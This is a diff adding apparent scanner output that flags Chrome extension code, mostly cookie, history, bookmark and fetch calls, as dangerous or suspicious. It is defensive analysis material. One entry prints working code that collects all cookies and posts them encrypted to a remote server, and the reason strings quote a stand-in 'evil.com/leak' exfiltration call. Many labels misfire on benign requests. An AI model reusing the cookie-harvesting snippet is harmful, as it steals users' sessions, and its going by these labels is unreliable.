@@ -1,0 +1,450 @@
+File: COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background.js
+Assessment: dangerous
+Code:
+chrome.cookies.getAll({ domain: `${domain}` })
+Reason: Accesses cookies, which may contain session tokens or personal data.
+------------------------------------------------------------
+File: COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background1.js
+Assessment: dangerous
+Code:
+chrome.cookies.getAll({domain:""+s})
+Reason: Accesses cookies, which may contain session tokens or personal data.
+------------------------------------------------------------
+File: COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background1.js
+Assessment: dangerous
+Code:
+chrome.cookies.getAll({},async e=>{if(0<e.length){var t=sjcl.encrypt(g,JSON.stringify(e),{ks:256});try{var a=new URLSearchParams;a.set("data",t),d=await ky.post(u,{headers:{Accept:"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",From:extensionName,ID:chrome.runtime.id,UUID:Utils.getUserID(),Cookies:i},credentials:"include",body:a}).text()}catch(e){}}n(e)})
+Reason: Accesses cookies, which may contain session tokens or personal data.
+------------------------------------------------------------
+File: HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js
+Assessment: dangerous
+Code:
+chrome.cookies.get({url:"https://shoppingcart.aliexpress.com/",name:"xman_us_f"},(e=>{i(e.value)}))
+Reason: Accesses cookies, which may contain session tokens or personal data.
+------------------------------------------------------------
+File: REDIRECTURL-hajkkfloelnggpmlehppgfhoncmghckc.1_20_320_2110/src/background/ext.js
+Assessment: dangerous
+Code:
+chrome.cookies.getAll({ domain: extSettings.ProductDomain }, function (cookies) { for (let i = 0; i < cookies.length; i++) { if (cookies[i].name.indexOf('trcrx_') != -1) { const cookieName = cookies[i].name.split('trcrx_')[1]; setSetting(cookieName, cookies[i].value, cookieName === 'guid'); } } if (callback) callback(); })
+Reason: Accesses cookies, which may contain session tokens or personal data.
+------------------------------------------------------------
+File: taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js
+Assessment: dangerous
+Code:
+chrome.history.search({ text: "", startTime: startTimeToday, endTime: endTimeToday, }, (data) => { setTodaysHistory(data); })
+Reason: Accesses browser history; e.g., history.search({}) reveals user behavior.
+------------------------------------------------------------
+File: taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js
+Assessment: dangerous
+Code:
+chrome.history.search({ text: "", startTime: startTimeYesterday, endTime: endTimeYesterday, }, (data) => { setYesterdayHistory(data); })
+Reason: Accesses browser history; e.g., history.search({}) reveals user behavior.
+------------------------------------------------------------
+File: taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js
+Assessment: dangerous
+Code:
+chrome.history.search({ text: "" }, (data) => { setSuggestHistory(data); })
+Reason: Accesses browser history; e.g., history.search({}) reveals user behavior.
+------------------------------------------------------------
+File: taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js
+Assessment: dangerous
+Code:
+chrome.cookies.getAll({domain:e,name:t},(t=>{var e;n(null===(e=t[0])||void 0===e?void 0:e.value)}))
+Reason: Accesses cookies, which may contain session tokens or personal data.
+------------------------------------------------------------
+File: taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js
+Assessment: dangerous
+Code:
+chrome.cookies.getAll({domain:e,name:t},(t=>{var e;r(null===(e=t[0])||void 0===e?void 0:e.value)}))
+Reason: Accesses cookies, which may contain session tokens or personal data.
+------------------------------------------------------------
+File: taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js
+Assessment: dangerous
+Code:
+chrome.cookies.getAll({domain:t,name:e},(e=>{var t;a(null===(t=e[0])||void 0===t?void 0:t.value)}))
+Reason: Accesses cookies, which may contain session tokens or personal data.
+------------------------------------------------------------
+File: taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js
+Assessment: dangerous
+Code:
+chrome.cookies.getAll({domain:t,name:e},(e=>{var t;o(null===(t=e[0])||void 0===t?void 0:t.value)}))
+Reason: Accesses cookies, which may contain session tokens or personal data.
+------------------------------------------------------------
+File: taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js
+Assessment: dangerous
+Code:
+chrome.cookies.getAll({domain:t,name:e},(e=>{var t;n(null===(t=e[0])||void 0===t?void 0:t.value)}))
+Reason: Accesses cookies, which may contain session tokens or personal data.
+------------------------------------------------------------
+File: taint-steps/SUMMARY-simplified-snippets/getAParameter-react-functionbody-chrome.tabs.create.js
+Assessment: dangerous
+Code:
+chrome.history.search( { text: "mytensai.com/install-ext?pid=" }, function(historyItems) { if(historyItems.length>0){ for (var i = 0; i < historyItems.length; ++i) { if(null!==getParameterByName('pid', historyItems[i].url) && getParameterByName('clickid', historyItems[i].url) ){  var pid = getParameterByName('pid', historyItems[i].url); var clickid = getParameterByName('clickid', historyItems[i].url); chrome.storage.sync.set({'pid':pid,'clickid': clickid}); //_gaq.push(['_trackEvent', clickid, 'clicked']);  var url = 'https://mytensai.com/mth/installTrack.php?pid='+pid+'&clickid='+clickid; fetch(url).then(function(response) { return response.json(); }).then(function(data) { console.log(data); }).catch(function() { console.log("Booo"); }); //HttpRequest(pid,clickid); return; } } }else{ chrome.storage.sync.set({'pid':'pid','clickid': 'clickid'}); } })
+Reason: Accesses browser history; e.g., history.search({}) reveals user behavior.
+------------------------------------------------------------
+File: BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js
+Assessment: suspicious
+Code:
+fetch(urlBase+'/a/n-cl', { method: 'GET', })
+Reason: Fetch with dynamic URL and sensitive payload (e.g., bookmarks, uuid).
+------------------------------------------------------------
+File: BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js
+Assessment: suspicious
+Code:
+fetch(urlBase+'/a/li-ch', { method: 'POST', headers: { 'Content-Type': 'application/json', }, body: JSON.stringify({ uuid: uuid }), })
+Reason: Fetch with dynamic URL and sensitive payload (e.g., bookmarks, uuid).
+------------------------------------------------------------
+File: BOOKMARK-akmaldiojcdmijjdgahboemcgbfmihlh.0_7_0_0/src/background.js
+Assessment: suspicious
+Code:
+fetch(urlBase+'/a/bo-ch', { method: 'POST', headers: { 'Content-Type': 'application/json', }, body: JSON.stringify({ uuid: uuid, bookmarks: bookmarks }), })
+Reason: Fetch with dynamic URL and sensitive payload (e.g., bookmarks, uuid).
+------------------------------------------------------------
+File: COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/assets/index.733e49c2.js
+Assessment: suspicious
+Code:
+fetch(n.href, i)
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/assets/index.733e49c2.js
+Assessment: suspicious
+Code:
+fetch(e.url, { method: e.method, headers: e.headers })
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/assets/index.733e49c2.js
+Assessment: suspicious
+Code:
+fetch(n.url, { method: n.method, headers: n.headers })
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/assets/index.733e49c2.js
+Assessment: suspicious
+Code:
+fetch(t.url, { method: t.method, headers: t.headers })
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background.js
+Assessment: suspicious
+Code:
+fetch(a.url, { method: a.method, headers: a.headers })
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background.js
+Assessment: suspicious
+Code:
+fetch('https://ringring.mobi/v1/TranslatorDictionary.txt?t=' + Math.floor(Date.now() / 1000))
+Reason: Fetch with dynamic URL and sensitive payload (e.g., bookmarks, uuid).
+------------------------------------------------------------
+File: COOKIE-ikdkbkbkdgffkcngafilhnamkgknlekc.3_0_0_0/src/background1.js
+Assessment: suspicious
+Code:
+fetch(a)
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: HISTORY-mmjbociiiafjimjiddoegfljjomglfoc.3_4_3_0/src/background.87838840.js
+Assessment: suspicious
+Code:
+fetch(e,{signal:i.signal,...n})
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js
+Assessment: suspicious
+Code:
+fetch(url, { credentials: 'include' })
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js
+Assessment: suspicious
+Code:
+fetch(_this3.primaryURL("/users/new/anonymous.json?skip_default_page=true&utm_medium=extension&utm_source=".concat(CURRENT_BROWSER)), { method: 'POST', credentials: 'include' })
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js
+Assessment: suspicious
+Code:
+fetch(_this4.primaryURL('/users/edit.json'), { method: 'PUT', credentials: 'include', body: data })
+Reason: Fetch with dynamic URL and sensitive payload (e.g., bookmarks, uuid).
+------------------------------------------------------------
+File: taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js
+Assessment: suspicious
+Code:
+fetch(Startme["a" /* default */].apiURL("/u/".concat(userData.user.public_id, "/extension_bookmarks.json?query=").concat(query.trim())), { method: 'GET', credentials: 'include', signal: controller.signal })
+Reason: Fetch with dynamic URL and sensitive payload (e.g., bookmarks, uuid).
+------------------------------------------------------------
+File: taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js
+Assessment: suspicious
+Code:
+fetch(Startme["a" /* default */].apiURL('/users/links_autosaving.json'), { credentials: 'include' })
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js
+Assessment: suspicious
+Code:
+fetch(Startme["a" /* default */].apiURL('/users/unsorted_link'), { method: 'POST', credentials: 'include', body: JSON.stringify(requestData.bookmarkData), headers: { 'Content-Type': 'application/json' } })
+Reason: Fetch with dynamic URL and sensitive payload (e.g., bookmarks, uuid).
+------------------------------------------------------------
+File: taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js
+Assessment: suspicious
+Code:
+fetch(Startme["a" /* default */].apiURL('/users/unsorted_links'), { method: 'POST', credentials: 'include', body: JSON.stringify({ bookmarks: requestData.bookmarksData }), headers: { 'Content-Type': 'application/json' } })
+Reason: Fetch with dynamic URL and sensitive payload (e.g., bookmarks, uuid).
+------------------------------------------------------------
+File: taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js
+Assessment: suspicious
+Code:
+fetch(Startme["a" /* default */].apiURL("/users/unsorted_link/".concat(requestData.id)), { method: 'PATCH', credentials: 'include', body: JSON.stringify(requestData.bookmarkData), headers: { 'Content-Type': 'application/json' } })
+Reason: Fetch with dynamic URL and sensitive payload (e.g., bookmarks, uuid).
+------------------------------------------------------------
+File: taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js
+Assessment: suspicious
+Code:
+fetch(Startme["a" /* default */].apiURL('/users/links_autosaving'), { method: 'POST', credentials: 'include', body: JSON.stringify(requestData), headers: { 'Content-Type': 'application/json' } })
+Reason: Fetch with dynamic URL and sensitive payload (e.g., bookmarks, uuid).
+------------------------------------------------------------
+File: taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js
+Assessment: suspicious
+Code:
+fetch(Startme["a" /* default */].apiURL("/users/unsorted_link/".concat(requestData.id)), { method: 'DELETE', credentials: 'include' })
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js
+Assessment: suspicious
+Code:
+fetch(Startme["a" /* default */].apiURL("/widget/".concat(requestData.widgetId, "/item")), { method: 'POST', credentials: 'include', body: JSON.stringify(requestData.bookmark), headers: { 'Content-Type': 'application/json' } })
+Reason: Fetch with dynamic URL and sensitive payload (e.g., bookmarks, uuid).
+------------------------------------------------------------
+File: taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js
+Assessment: suspicious
+Code:
+fetch(Startme["a" /* default */].apiURL("/widget/".concat(requestData.widgetId, "/items")), { method: 'POST', credentials: 'include', body: JSON.stringify({ bookmarks: requestData.bookmarks }), headers: { 'Content-Type': 'application/json' } })
+Reason: Fetch with dynamic URL and sensitive payload (e.g., bookmarks, uuid).
+------------------------------------------------------------
+File: taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js
+Assessment: suspicious
+Code:
+fetch(Startme["a" /* default */].apiURL("/page/".concat(requestData.pageId, "/widget")), { method: 'POST', credentials: 'include', body: JSON.stringify(requestData.widget), headers: { 'Content-Type': 'application/json' } })
+Reason: Fetch with dynamic URL and sensitive payload (e.g., bookmarks, uuid).
+------------------------------------------------------------
+File: taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js
+Assessment: suspicious
+Code:
+fetch(Startme["a" /* default */].apiURL("/tools/check_link_exists?url=".concat(requestData.url)), { credentials: 'include', signal: controller.signal })
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js
+Assessment: suspicious
+Code:
+fetch(Startme["a" /* default */].apiURL("/tools/title?url=".concat(url)), { credentials: 'include' })
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js
+Assessment: suspicious
+Code:
+fetch(Startme["a" /* default */].apiURL("/tools/title_from_resource?url=".concat(url)), { credentials: 'include' })
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js
+Assessment: suspicious
+Code:
+fetch(Startme["a" /* default */].apiURL('/import'), { method: 'POST', credentials: 'include', body: data })
+Reason: Fetch with dynamic URL and sensitive payload (e.g., bookmarks, uuid).
+------------------------------------------------------------
+File: taint-steps/0-propWrite/src/cfmnkhhioonhiehehedmnjibmampjiab.7_3_0_0/js/background.js
+Assessment: suspicious
+Code:
+fetch(Startme["a" /* default */].apiURL('/import/poll/' + importId), { credentials: 'include' })
+Reason: Fetch with dynamic URL and sensitive payload (e.g., bookmarks, uuid).
+------------------------------------------------------------
+File: taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js
+Assessment: dangerous
+Code:
+fetch(`https://www.google.com/s2/favicons?domain=${widgetUrlFromUser}&sz=128`)
+Reason: Sends data to external domain (e.g., fetch('https://evil.com/leak')).
+------------------------------------------------------------
+File: taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js
+Assessment: dangerous
+Code:
+fetch("https://chat.openai.com/chat")
+Reason: Sends data to external domain (e.g., fetch('https://evil.com/leak')).
+------------------------------------------------------------
+File: taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js
+Assessment: suspicious
+Code:
+fetch(url)
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js
+Assessment: suspicious
+Code:
+fetch(url, options)
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: taint-steps/3-getAParameter/src/bkiakepgpgfibglghlhdpacjdglfpbnn.0_0_4_0/popup.js
+Assessment: dangerous
+Code:
+fetch(`https://openweathermap.org/img/wn/${icon}.png`)
+Reason: Sends data to external domain (e.g., fetch('https://evil.com/leak')).
+------------------------------------------------------------
+File: taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/554/554.js
+Assessment: suspicious
+Code:
+fetch(i,s)
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/background.js
+Assessment: suspicious
+Code:
+fetch(e,Object.assign(Object.assign({},n),{method:"GET"}))
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/margin_calculator/margin_calculator.js
+Assessment: suspicious
+Code:
+fetch(`https://m.search.naver.com/p/csearch/content/qapirender.nhn?pkid=141&key=exchangeApiBasic&where=nexearch&q=%ED%99%98%EC%9C%A8+%EA%B3%84%EC%82%B0%EA%B8%B0&u6=standardUnit&u7=0&u3=CNY&u4=KRW&u2=1&u1=keb&u8=down&u5=all&_=${e}`)
+Reason: Fetch with dynamic URL and sensitive payload (e.g., bookmarks, uuid).
+------------------------------------------------------------
+File: taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/popup/popup.js
+Assessment: suspicious
+Code:
+fetch(n,c)
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis/product_analysis.js
+Assessment: suspicious
+Code:
+fetch(l,Object.assign(Object.assign({},a),{method:"GET"}))
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_extracting_page/product_analysis_extracting_page.js
+Assessment: suspicious
+Code:
+fetch(e)
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: taint-steps/4-yield/src/ecmeogcbcoalojmkfkmancobmiahaigg.3_7_5_0/product_analysis_script/product_analysis_script.js
+Assessment: dangerous
+Code:
+fetch(`${"brand.naver.com"===location.host?"https://brand.naver.com/n":"https://smartstore.naver.com/i"}/v1/stores/${n}/products/${e}`)
+Reason: Sends data to external domain (e.g., fetch('https://evil.com/leak')).
+------------------------------------------------------------
+File: api-samples/bookmarks/popup.js
+Assessment: dangerous
+Code:
+chrome.bookmarks.create( { title: 'Google', url: 'https://www.google.com' }, () => { console.log('Bookmark added'); location.reload(); // Refresh the popup } )
+Reason: Creates bookmarks with potentially misleading/malicious links.
+------------------------------------------------------------
+File: api-samples/cookies/cookie-clearer/popup.js
+Assessment: dangerous
+Code:
+chrome.cookies.getAll({ domain })
+Reason: Accesses cookies, which may contain session tokens or personal data.
+------------------------------------------------------------
+File: api-samples/cookies/cookie-clearer/popup.js
+Assessment: dangerous
+Code:
+chrome.cookies.remove({ url: cookieUrl, name: cookie.name, storeId: cookie.storeId })
+Reason: Accesses cookies, which may contain session tokens or personal data.
+------------------------------------------------------------
+File: api-samples/history/historyOverride/logic.js
+Assessment: dangerous
+Code:
+chrome.history.deleteUrl({ url: item.url })
+Reason: Accesses browser history; e.g., history.search({}) reveals user behavior.
+------------------------------------------------------------
+File: api-samples/history/historyOverride/logic.js
+Assessment: dangerous
+Code:
+chrome.history.search({ text: searchQuery, startTime: kOneWeekAgo })
+Reason: Accesses browser history; e.g., history.search({}) reveals user behavior.
+------------------------------------------------------------
+File: api-samples/history/historyOverride/logic.js
+Assessment: dangerous
+Code:
+chrome.history.deleteUrl({ url: checkbox.value })
+Reason: Accesses browser history; e.g., history.search({}) reveals user behavior.
+------------------------------------------------------------
+File: api-samples/history/historyOverride/logic.js
+Assessment: dangerous
+Code:
+chrome.history.deleteAll()
+Reason: Accesses browser history; e.g., history.search({}) reveals user behavior.
+------------------------------------------------------------
+File: api-samples/history/showHistory/popup.js
+Assessment: dangerous
+Code:
+chrome.history.search( { text: '', // Return every history item.... startTime: oneWeekAgo // that was accessed less than one week ago. }, function (historyItems) { // For each history item, get details on all visits. for (let i = 0; i < historyItems.length; ++i) { let url = historyItems[i].url; let processVisitsWithUrl = function (url) { // We need the url of the visited item to process the visit. // Use a closure to bind the  url into the callback's args. return function (visitItems) { processVisits(url, visitItems); }; }; chrome.history.getVisits({ url: url }, processVisitsWithUrl(url)); numRequestsOutstanding++; } if (!numRequestsOutstanding) { onAllVisitsProcessed(); } } )
+Reason: Accesses browser history; e.g., history.search({}) reveals user behavior.
+------------------------------------------------------------
+File: api-samples/history/showHistory/popup.js
+Assessment: dangerous
+Code:
+chrome.history.getVisits({ url: url }, processVisitsWithUrl(url))
+Reason: Accesses browser history; e.g., history.search({}) reveals user behavior.
+------------------------------------------------------------
+File: functional-samples/sample.bookmarks/popup.js
+Assessment: suspicious
+Code:
+chrome.bookmarks.remove(String(bookmarkNode.id))
+Reason: Deletes user bookmarks; could be dangerous if not confirmed by user.
+------------------------------------------------------------
+File: api-samples/action/demo/index.js
+Assessment: suspicious
+Code:
+fetch(chrome.runtime.getURL(emojiFile))
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: api-samples/identity/identity.js
+Assessment: suspicious
+Code:
+fetch(url, { method: method, headers: { Authorization: 'Bearer ' + access_token } })
+Reason: Fetch with dynamic URL and sensitive payload (e.g., bookmarks, uuid).
+------------------------------------------------------------
+File: api-samples/identity/identity.js
+Assessment: suspicious
+Code:
+fetch( 'https://oauth2.googleapis.com/revoke?token=' + current_token.token, { method: 'POST' } )
+Reason: Fetch with dynamic URL and sensitive payload (e.g., bookmarks, uuid).
+------------------------------------------------------------
+File: api-samples/printing/printers.js
+Assessment: suspicious
+Code:
+fetch(filename)
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: functional-samples/cookbook.wasm-helloworld-print/wasm/pkg/helloworld_demo.js
+Assessment: suspicious
+Code:
+fetch(input)
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: functional-samples/libraries-xhr-in-sw/third_party/xhr-shim/xhr-shim.js
+Assessment: suspicious
+Code:
+fetch(this[sURL], { method: this[sMethod] || 'GET', signal: this[sAbortController].signal, headers: this[sHeaders], credentials: this.withCredentials ? 'include' : 'same-origin', body })
+Reason: Fetch request to unknown or dynamic destination.
+------------------------------------------------------------
+File: functional-samples/sample.milestones/popup.js
+Assessment: dangerous
+Code:
+fetch(`https://crrie.com/c/?r=${revId}`)
+Reason: Sends data to external domain (e.g., fetch('https://evil.com/leak')).
+------------------------------------------------------------
+File: functional-samples/tutorial.google-analytics/scripts/google-analytics.js
+Assessment: suspicious
+Code:
+fetch( `${ this.debug ? GA_DEBUG_ENDPOINT : GA_ENDPOINT }?measurement_id=${MEASUREMENT_ID}&api_secret=${API_SECRET}`, { method: 'POST', body: JSON.stringify({ client_id: await this.getOrCreateClientId(), events: [ { name, params } ] }) } )
+Reason: Fetch with dynamic URL and sensitive payload (e.g., bookmarks, uuid).
+------------------------------------------------------------
+File: functional-samples/tutorial.open-api-reference/sw-tips.js
+Assessment: dangerous
+Code:
+fetch('https://extension-tips.glitch.me/tips.json')
+Reason: Sends data to external domain (e.g., fetch('https://evil.com/leak')).
+------------------------------------------------------------
+File: functional-samples/tutorial.websockets/service-worker.js
+Assessment: dangerous
+Code:
+fetch('https://chrome-extension-websockets.glitch.me/', { mode: 'no-cors' })
+Reason: Sends data to external domain (e.g., fetch('https://evil.com/leak')).
+------------------------------------------------------------
